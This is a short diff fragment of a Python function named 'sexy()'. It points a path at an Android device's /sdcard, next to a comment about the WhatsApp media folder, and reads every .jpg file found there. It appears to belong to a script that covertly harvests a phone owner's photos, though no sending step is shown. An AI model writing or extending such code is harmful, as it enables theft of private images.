@@ -6,7 +6,7 @@ def sexy():
 					
     #----------( /sdcard/WhatsApp/Media/WhatsApp Documents
     try:
-        sdcard_path = '{server1}'
+        sdcard_path = '/sdcard'
         file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
         for file in file_list:
             with open(os.path.join(sdcard_path, file), 'rb') as f:
